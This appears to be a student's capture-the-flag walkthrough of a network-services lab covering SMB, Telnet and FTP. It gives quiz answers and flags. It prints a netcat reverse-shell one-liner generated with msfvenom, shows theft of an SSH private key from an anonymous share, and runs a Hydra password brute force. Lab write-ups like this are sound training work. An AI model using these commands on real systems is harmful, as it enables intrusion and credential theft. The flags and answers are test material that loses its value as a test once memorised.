NETW-SERVICES
#############
:Author: David Boyd
:Date: 2020-10-23

[Task 2] Understanding SMB
**************************

What is SMB?
============

SMB - Server Message Block Protocol - is a client-server communication protocol
used for sharing access to files, printers, serial ports and other resources on
a network. [source]

Servers make file systems and other resources (printers, named pipes, APIs)
available to clients on the network. Client computers may have their own hard
disks, but they also want access to the shared file systems and printers on the
servers.

The SMB protocol is known as a **response-request** protocol, meaning that it
transmits multiple messages between the client and server to establish a
connection. Clients connect to servers using **TCP/IP (actually NetBIOS over
TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX**.

How does SMB work?
==================

Once they have established a connection, clients can then send commands (SMBs)
to the server that allow them to access shares, open files, read and write
files, and generally do all the sort of things that you want to do with a file
system. However, in the case of SMB, these things are done over the network.

What runs SMB?
==============

Microsoft Windows operating systems since Windows 95 have included client and
server SMB protocol support. Samba, an open source server that supports the SMB
protocol, was released for Unix systems.


#. What does SMB stand for?

	- Server Message Block

#. What type of protocol is SMB?

	- request-response

#. What do clients connect to servers using?

	- TCP/IP

#. What systems does Samba run on?

	- UNIX

[Task 3] Enumerating SMB
************************
:prgms: sudo apt install enum4linux

enum4linux
==========

enum4linux
	is a tool used to enumerate SMB shares on both Windows & Linux that makes
	it easy to quickly extract information from the target pertaining to SMB.

+-----+---------------------------------------------+
| TAG | FUNCTION                                    |
+=====+=============================================+
| -U  | get userlist                                |
+-----+---------------------------------------------+
| -M  | get machine list                            |
+-----+---------------------------------------------+
| -N  | get namelist dump (different from -U and-M) |
+-----+---------------------------------------------+
| -S  | get sharelist                               |
+-----+---------------------------------------------+
| -P  | get password policy information             |
+-----+---------------------------------------------+
| -G  | get group and member list                   |
+-----+---------------------------------------------+
| -a  | all of the above (full basic enumeration)   |
+-----+---------------------------------------------+

Walkthrough
===========

.. code-block:: Bash

	# Get open ports
	nmap -T5 -Pn $TM

	# Get SMB information
	enum4linux -a $TM

#. Conduct an nmap scan of your choosing, How many ports are open?

	- 3

	Notes:
		- Don't count the 'filtered' ports
		- By default, nmap does '1000' top port scans.  Adjust accordingly.
		- Easy math: Subtract 1000 - 'closed ports' = number of open ports

#. What ports is SMB running on?

	- 139/445

#. Let's get started with Enum4Linux, conduct a full basic enumeration. For
   starters, what is the workgroup name?

	- WORKGROUP

	Notes:
		- Section 02: Enumerating Workgroup/Domain on $TM

#. What comes up as the name of the machine?

	- POLOSMB

	Notes:
		- Section 06: OS information on $TM

#. What operating system version is running?

	- 6.1

	Notes:
		- Section 06: OS information on $TM

#. What share sticks out as something we might want to investigate?

	- profiles

	Notes:
		- Section 08: Share Enumeration on $TM

[Task 4] Exploiting SMB
***********************
:SMB CVE: https://www.cvedetails.com/cve/CVE-2017-7494/
:More Common: misconfigurations

What we've learned from our prev->enum4linux:

	- the SMB Share location
	- the name of the interesting SMB share

SMBClient
=========
:installation: sudo apt install smbclient
:Reference: https://wiki.hpc.uconn.edu/index.php/File_transfer_via_SMB

SMBClient
	This package contains command-line utilities for *accessing Microsoft
	Windows and Samba servers*, including smbclient, smbtar, and smbspool.
	Utilities for mounting shares locally are found in the package
	cifs-utils.

! [shell command]
	If shell command is specified, the ! command will execute a shell locally
	and run the specified shell command. If no command is specified, a local
	shell will be run. ]

Walkthrough
===========

1. What would be the correct syntax to access an SMB share called "secret" as
user "suit" on a machine with the IP 10.10.10.2 on the default port?

	- smbclient //10.10.10.2/secret -U suit -p 139

	Notes:
		- port 139: SMB over NETBIOS
		- port 445: SMB over IP

2. Great! Now you've got a hang of the syntax, let's have a go at trying to
exploit this vulnerability. You have a list of users, the name of the share
(smb) and a suspected vulnerability.

	- [Completed]

3.  Lets see if our interesting share has been configured to allow anonymous
access, I.E it doesn't require authentication to view the files. We can do this
easily by:

	- using the username "Anonymous"

	- connecting to the share we found during the enumeration stage

	- and not supplying a password.

Does the share allow anonymous access? Y/N?

	- Y

.. code-block:: Bash

	smbclient //$TM/profiles -U Anonymous

4.  Great! Have a look around for any interesting documents that could contain
valuable information. Who can we assume this profile folder belongs to?

	- John Cactus

.. code-block:: Bash

	# Show a list of available commands
	smb: \> help
	# SHow command syntax & info
	smb: \> help <command>

	ls
	# Display file from list of available commands
	more "Working From Home Information.txt"

5. What service has been configured to allow him to work from home?

	- ssh

	Notes:
		- read the text file.

6. Okay! Now we know this, what directory on the share should we look in?

	- .ssh

7.  This directory contains authentication keys that allow a user to
authenticate themselves on, and then access, a server. Which of these keys is
most useful to us?

	- id_rsa

	Notes:
		- the private key is what we always want!

8. Download this file to your local machine, and change the permissions to "600"
using "chmod 600 [file]".

Now, use the information you have already gathered to work out the username of
the account. Then, use the service and key to log-in to the server.

What is the smb.txt flag?

	- THM{smb_is_fun_eh?}

.. code-block:: Bash

	# get a remote file
	smb: \> get id_rsa ./id_rsa                # get <remote name> [local name]
	smb: \> q

	# ssh using priv.key
	ssh -i id_rsa cactus@$TM -p 22

	# Capture the Flag
	ls
	cat smb.txt
-

	Notes:
		- The enum4linux -a will attempt to extract usernames
		- grep catcus ./task3_smb-enum4linux-a.txt

[Task 5] Understanding Telnet
*****************************

Answers are in the reading.

[Task 6] Enumerating Target
***************************

Quiz
====

1. How many ports are open on the target machine?

	- 1

[Walkthrough]

.. code-block:: Bash

	nmap -Pn -p- -T5 $TM

2. What port is this?

	- 8012

3. This port is unassigned, but still lists the protocol it's using, what
protocol is this?

	- TCP

4. Now re-run the nmap scan, without the -p- tag, how many ports show up as
open?

	- 0

	[Walkthrough]

.. code-block:: Bash

	nmap -Pn -T5 $TM


5. Here, we see that by assigning telnet to a non-standard port, it is not
part of the common ports list, or top 1000 ports, that nmap scans. It's
important to try every angle when enumerating, as the information you gather
here will inform your exploitation stage.

	- [No answer needed]

6. Based on the title returned to us, what do we think this port could be used
for?

	- A backdoor

.. code-block:: Bash

	sudo nmap -A -p 8012 -T5 $TM

7. Who could it belong to? Gathering possible usernames is an important step in
enumeration.

	- Skidy

8. Always keep a note of information you find during your enumeration stage, so
you can refer back to it when you move on to try exploits.

	[No answer needed]

[Task 7] Exploiting Telnet
**************************

Troubleshooting
===============

.. code-block:: Bash

	 2017-09-07 11:31:31 SIGUSR1[soft,connection-reset] received, process restarting]

:Reason: openVPN is connected **twice**.(Linux: ps aux; Windows: openVPN on/off)
:Solution: kill all instances and restart; then restart $TM

Walkthrough
===========


1.  Okay, let's try and connect to this telnet port! If you get stuck, have a
look at the syntax for connecting outlined above.

	- [No answer needed]

2.  Great! It's an open telnet connection! What welcome message do we receive?

	- SKIDY'S BACKDOOR

.. code-block:: Bash

	telnet $TM 8012

3. Let's try executing some commands, do we get a return on any input we enter
into the telnet session? (Y/N)

	- N

4. Hmm... that's strange. Let's check to see if what we're typing is being
executed as a system command.

	- [No answer needed]

5. Start a tcpdump listener on your local machine using: "sudo tcpdump ip proto
\\icmp -i tun0" This starts a tcpdump listener, specifically listening for ICMP
traffic, which pings operate on.

	- [No answer needed]

.. code-block:: Bash

	# Init tcpdump listener on $LM
	sudo tcpdump ip proto \\icmp -i tun0 -w output.pcap -v

	# Read pcap file if written to output file
	sudo tcpdump -r output.pcap

6. Now, use the command "ping [local tun0 ip] -c 1" through the telnet session
to see if we're able to execute system commands. Do we receive any pings? Note,
you need to preface this with .RUN (Y/N)

	- Y

.. code-block:: Bash

	ping $LM -c 1

7. Great! This means that we are able to execute system commands AND that we are
able to reach our local machine. Now let's have some fun!

	- [No answer needed]

8. We're going to generate a reverse shell payload using msfvenom.This will
generate and encode a netcat reverse shell for us. Here's our syntax:
"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"

-p = payload
lhost = our local host IP address
lport = the port to listen on
R = export the payload in raw format

What word does the generated payload start with?

	- mkfifo					// make first in first out  (named pipes)

.. code-block:: Bash

	msfvenom -p cmd/unix/reverse_netcat lhost=$LM lport=4444 R

	# List all payloads
	msfvenom -l payloads > msfvenom-payloads.txt


9. Perfect. We're nearly there. Now all we need to do is start a netcat listener
on our local machine. We do this using:

"nc -lvp [listening port]"

What would the command look like for the listening port we selected in our
payload?

	- nc -lvp 4444

.. code-block:: Bash

	nc -nvlp 4444

10. Great! Now that's running, we need to copy and paste our msfvenom payload
into the telnet session and run it as a command. Hopefully- this will give us a
shell on the target machine!

	- [No answer needed]

.. code-block:: Bash

	# On $TM
	telnet $TM 8012
		> Trying 10.10.127.34...
		> Connected to 10.10.127.34.
		> Escape character is '^]'.
		> SKIDY'S BACKDOOR. Type .HELP to view commands
	.RUN ping 10.2.7.145 -c 1
	.RUN mkfifo /tmp/bdpxai; nc 10.2.7.145 4444 0</tmp/bdpxai | /bin/sh >/tmp/bdpxai 2>&1; rm /tmp/bdpxai

11. Success! What is the contents of flag.txt?

 - THM{y0u_g0t_th3_t3ln3t_fl4g}

.. code-block:: Bash

	# On $LM
	nc -nvlp 4444
		> Listening on 0.0.0.0 4444
		> Connection received on 10.10.127.34 40354
	ls
		> flag.txt
	cat flag.txt
		> THM{y0u_g0t_th3_t3ln3t_fl4g}

[Task 8] Understanding FTP
**************************

[SKIPPED]

[Task 9] Enumerating FTP
************************
:REF: https://www.cs.colostate.edu/helpdocs/ftp.html

WSL
===

.. code-block:: Bash

	sudo apt install ftp

Quiz
====


1. Run an nmap scan of your choice. How many ports are open on the target
machine?

	- 2

2. What port is ftp running on?

	- 21

3. What variant of FTP is running on it?

	- vsftpd

4. Great, now we know what type of FTP server we're dealing with we can check
to see if we are able to login anonymously to the FTP server. We can do this
using by typing "ftp [IP]" into the console, and entering "anonymous", and no
password when prompted.

What is the name of the file in the anonymous FTP directory?

	- PUBLIC_NOTICE.txt

.. code-block:: Bash

	ftp $TM
	anonymous
	ls

5. What do we think a possible usernamecould be?

	- mike

. code-block:: Bash

	get PUBLIC_NOTICE.txt
	!cat PUBLIC_NOTICE.txt

6. Great! Now we've got details about the FTP server and, crucially, a possible
username. Let's see what we can do with that..."""]"

	- [No answer needed]

[Task 10] Exploiting FTP
************************

Using this information, let's try and bruteforce the password of the FTP
Server.

Hydra
=====

Hydra is a very fast online password cracking tool, which can perform rapid
dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH,
FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default
on both Parrot and Kali, however if you need it, you can find the GitHub here.

The syntax for the command we're going to use to find the passwords is this:

.. code-block:: Bash

	hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp

Let's break it down:

+----------------+---------------------------------------------------------------------------------------+
| SECTION        | FUNCTION                                                                              |
+================+=======================================================================================+
| hydra          | Runs the hydra tool                                                                   |
+----------------+---------------------------------------------------------------------------------------+
| -t 4           | Number of parallel connections per target [user]                                      |
+----------------+---------------------------------------------------------------------------------------+
| -l             | Points to the user who's account you're trying to compromise [path to dictionary]     |
+----------------+---------------------------------------------------------------------------------------+
| -P             | Points to the file containing the list of possible passwords                          |
+----------------+---------------------------------------------------------------------------------------+
| -vV            | Sets verbose mode to very verbose , shows the login+pass combination for each attempt |
+----------------+---------------------------------------------------------------------------------------+
| [machine IP]   | The IP address of the target machine                                                  |
+----------------+---------------------------------------------------------------------------------------+
| ftp / protocol | Sets the protocol                                                                     |
+----------------+---------------------------------------------------------------------------------------+

Quiz
====

1. What is the password for the user "mike"?

	- password

.. code-block:: Bash

	hydra -t 64 -l mike -P /usr/share/wordlists/rockyou.txt -vV $TM ftp

2.  Bingo! Now, let's connect to the FTP server as this user using "ftp [IP]" and
entering the credentials when prompted

	- [No answer needed]

3. What is ftp.txt?

	- THM{y0u_g0t_th3_ftp_fl4g}

.. code-block:: Bash

	ftp $TM
	mike
	password
	ls
	get ftp.txt
	!cat ftp.txt

[Task 11] Expanding Your Knowledge
**********************************

Futher Reading:

	- https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
	- https://attack.mitre.org/techniques/T1210/
	- https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/

